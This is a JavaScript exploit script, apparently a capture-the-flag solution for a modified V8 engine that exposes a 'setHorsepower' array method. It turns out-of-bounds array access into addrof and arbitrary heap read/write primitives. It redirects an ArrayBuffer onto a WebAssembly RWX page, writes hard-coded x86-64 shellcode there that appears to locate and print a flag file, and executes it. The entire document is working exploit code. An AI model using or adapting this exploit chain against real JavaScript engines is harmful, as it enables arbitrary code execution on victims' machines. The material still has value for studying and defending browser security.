var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
function compress_elementptr(old_val, low_32bits_to_set) {
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}

function float_arr_pointing_at(addr) {
  var float_buf = [9.1, 9.2];
  float_buf.setHorsepower(4);
  float_buf[3] = compress_elementptr(float_buf[3], addr);
  return float_buf;
}
function read_in_heap(addr) {
  return float_arr_pointing_at(addr)[0];
}
function write_in_heap(addr, value) {
  float_arr_pointing_at(addr)[0] = value;
}

var obj_arr = [0.1];
obj_arr.setHorsepower(4);

var obj_arr_elementptr = ftoi_low32(obj_arr[2]);
var obj_arr_base = obj_arr_elementptr + 8n + 8n;
var obj_arr_elementptr_addr = obj_arr_base + 8n;

function addrof(obj) {
  obj_arr[0] = obj;
  var elementptr = ftoi_low32(read_in_heap(obj_arr_elementptr_addr));
  var val = ftoi_low32(read_in_heap(elementptr + 8n));
  return val;
}

var wasm_data = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
  0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
  138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11,
]);
var module = new WebAssembly.Module(wasm_data);
var instance = new WebAssembly.Instance(module);
var exec_machine_code = instance.exports.main;

var wasm_instance_base_addr = addrof(instance) - 1n;
var rwx_page_ptr_addr = wasm_instance_base_addr + 105n;
var rwx_page_ptr = ftoi(read_in_heap(rwx_page_ptr_addr));

var arr_buf = new ArrayBuffer(0x400);
var dataview = new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf);
var arr_buf_backing_store_addr = arr_buf_addr + 20n;
write_in_heap(arr_buf_backing_store_addr, itof(rwx_page_ptr));
console.log(
  "rwx_page_main_ptr: 0x" + rwx_page_ptr.toString(16).padStart(16, "0")
);
// See shellcode.js
// prettier-ignore
var machine_code = [ 0xfa1e0ff3, 0x56415741, 0x54415541, 0x81485355, 0x001000ec, 0x0c834800, 0x81480024, 0x0007b0ec, 0x002eba00, 0x2cb90000, 0xbb000020, 0x00000101, 0xffff9cbf, 0x66d889ff, 0x98245489, 0x24748d48, 0x0800ba98, 0x89660009, 0xc69a244c, 0x009c2444, 0x8948050f, 0x648d4cc3, 0x8948a824, 0x41902444, 0x00bac789, 0xb8000004, 0x0000004e, 0x894cdf89, 0x48050fe6, 0x840fc085, 0x000000b0, 0x0001ba41, 0x8d4c0000, 0x489b2474, 0x8945c589, 0x6c8d4cd0, 0x29459a24, 0x001f0ff0, 0x8548db31, 0x906f7eed, 0x1c0c8d4d, 0x12798041, 0x718d4900, 0x418d4912, 0x29840f13, 0x44000001, 0xc129d189, 0x00401f0f, 0x4801148d, 0x8001c083, 0x7500ff78, 0xd08944f3, 0x0fd78944, 0x247c8005, 0x840f009a, 0x000000f0, 0x0ff0894c, 0x0000441f, 0x00148d41, 0x01c08348, 0x00ff7880, 0x8944f275, 0xd78944d0, 0x0fee894c, 0xb70f4105, 0x01481041, 0xeb3948c3, 0x00ba927c, 0xb8000004, 0x0000004e, 0x4cff8944, 0x050fe689, 0x48c58948, 0x850fc085, 0xffffff6c, 0x90247c8b, 0x000003b8, 0x45050f00, 0x02bbc931, 0xc6000000, 0x00a72444, 0x2f2eb848, 0x67616c66, 0x8948742e, 0xb89d2444, 0x00007478, 0x44ce8944, 0x8966ca89, 0x48a52444, 0x9d247c8d, 0x050fd889, 0x48c08949, 0xa824b48d, 0xba000003, 0x00001400, 0x44c88944, 0x050fc789, 0xa824bc80, 0x00000003, 0x8d485974, 0x03a92484, 0x01b90000, 0x29000000, 0x001f0fc1, 0x4801148d, 0x8001c083, 0x7500ff78, 0x0001b8f3, 0xc7890000, 0x03b8050f, 0x44000000, 0x050fc789, 0x002504c6, 0x00000000, 0x0f660b0f, 0x0000441f, 0x1fe9d231, 0x66ffffff, 0x00841f0f, 0x00000000, 0xe6e9d231, 0x31fffffe, 0x00c2ebd2 ];
for (let i = 0; i < machine_code.length; i += 1) {
  dataview.setBigUint64(i * 4, BigInt(machine_code[i]), true);
}

exec_machine_code();

while (true) {}
